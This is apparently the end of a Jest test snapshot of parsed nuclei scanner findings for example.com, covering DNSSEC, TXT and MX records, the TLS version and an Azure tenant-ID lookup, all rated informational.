        "31589 8 2 CDE0D742D6998AA554A92D890F8184C698CFAC8A26FA59875A990C03E576343C",
        "43547 8 1 B6225AB2CC613E0DCA7962BDC2342EA4F1B56083",
        "43547 8 2 615A64233543F66F44D68933625B17497C89A70E858ED76A2145997EDF96A918",
      ],
      "hostname": "example.com",
      "ip": null,
      "matched_at": "https://example.com",
      "matched_line": null,
      "matcher_name": null,
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": Array [
        "https://www.icann.org/resources/pages/dnssec-what-is-it-why-important-2019-03-05-en",
        "https://www.cyberciti.biz/faq/unix-linux-test-and-validate-dnssec-using-dig-command-line/",
      ],
      "request": null,
      "response": null,
      "tags": Array [
        "dns",
        "dnssec",
      ],
      "template": "dns/dnssec-detection.yaml",
      "template_id": "dnssec-detection",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/dns/dnssec-detection.yaml",
      "timestamp": "2022-09-09T21:20:38.059221+02:00",
      "type": "dns",
    },
    "category": "dnssec-detection",
    "description": "Domain Name System Security Extensions (DNSSEC) are enabled. The Delegation of Signing (DS) record provides information about a signed zone file when DNSSEC enabled.",
    "location": "https://example.com",
    "name": "DNSSEC Detection",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "pdteam",
      ],
      "curl_command": null,
      "extracted_results": Array [
        "\\"v=spf1 -all\\"",
        "\\"wgyf8z8cgvm2qmxpnbnldrcltvk4xqfn\\"",
      ],
      "hostname": "example.com",
      "ip": null,
      "matched_at": "https://example.com",
      "matched_line": null,
      "matcher_name": null,
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": Array [
        "https://www.netspi.com/blog/technical/network-penetration-testing/analyzing-dns-txt-records-to-fingerprint-service-providers/",
      ],
      "request": null,
      "response": null,
      "tags": Array [
        "dns",
        "txt",
      ],
      "template": "dns/txt-fingerprint.yaml",
      "template_id": "txt-fingerprint",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/dns/txt-fingerprint.yaml",
      "timestamp": "2022-09-09T21:20:45.095908+02:00",
      "type": "dns",
    },
    "category": "txt-fingerprint",
    "description": "A DNS TXT record was detected. The TXT record lets a domain admin leave notes on a DNS server.",
    "location": "https://example.com",
    "name": "DNS TXT Record Detected",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "pdteam",
      ],
      "curl_command": null,
      "extracted_results": Array [
        "0 .",
      ],
      "hostname": "example.com",
      "ip": null,
      "matched_at": "https://example.com",
      "matched_line": null,
      "matcher_name": null,
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": Array [
        "https://www.cloudflare.com/learning/dns/dns-records/dns-mx-record/",
        "https://mxtoolbox.com/",
      ],
      "request": null,
      "response": null,
      "tags": Array [
        "dns",
        "mx",
      ],
      "template": "dns/mx-fingerprint.yaml",
      "template_id": "mx-fingerprint",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/dns/mx-fingerprint.yaml",
      "timestamp": "2022-09-09T21:20:54.419479+02:00",
      "type": "dns",
    },
    "category": "mx-fingerprint",
    "description": "An MX record was detected. MX records direct emails to a mail exchange server.",
    "location": "https://example.com",
    "name": "MX Record Detection",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "pdteam",
      ],
      "curl_command": null,
      "extracted_results": Array [
        "TLS13",
      ],
      "hostname": "example.com",
      "ip": "93.184.216.34",
      "matched_at": "https://example.com",
      "matched_line": null,
      "matcher_name": null,
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "ssl",
      ],
      "template": "ssl/tls-version.yaml",
      "template_id": "tls-version",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/ssl/tls-version.yaml",
      "timestamp": "2022-09-09T21:21:04.604798+02:00",
      "type": "ssl",
    },
    "category": "tls-version",
    "description": "The name of the nuclei rule which triggered the finding: tls-version",
    "location": "https://example.com",
    "name": "TLS Version",
    "severity": "INFORMATIONAL",
  },
  Object {
    "attributes": Object {
      "author": Array [
        "v0idc0de",
      ],
      "curl_command": "curl -X 'GET' -d '' -H 'Host: login.microsoftonline.com' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36' 'https://login.microsoftonline.com:443/example.com/v2.0/.well-known/openid-configuration'",
      "extracted_results": Array [
        "c7c08208-4f4d-45f1-83cd-5e2f491ab786",
      ],
      "hostname": "example.com",
      "ip": "40.126.32.140",
      "matched_at": "https://login.microsoftonline.com:443/example.com/v2.0/.well-known/openid-configuration",
      "matched_line": null,
      "matcher_name": null,
      "matcher_status": true,
      "metadata": null,
      "path": null,
      "reference": null,
      "request": null,
      "response": null,
      "tags": Array [
        "azure",
        "microsoft",
        "cloud",
      ],
      "template": "exposures/configs/azure-domain-tenant.yaml",
      "template_id": "azure-domain-tenant",
      "template_url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/exposures/configs/azure-domain-tenant.yaml",
      "timestamp": "2022-09-09T21:21:17.696098+02:00",
      "type": "http",
    },
    "category": "azure-domain-tenant",
    "description": "Checks if the domain is part of an Azure tenant and finds the ID using Azure's OpenID discovery page.",
    "location": "https://example.com",
    "name": "Microsoft Azure - Domain Tenant ID",
    "severity": "INFORMATIONAL",
  },
]
`;
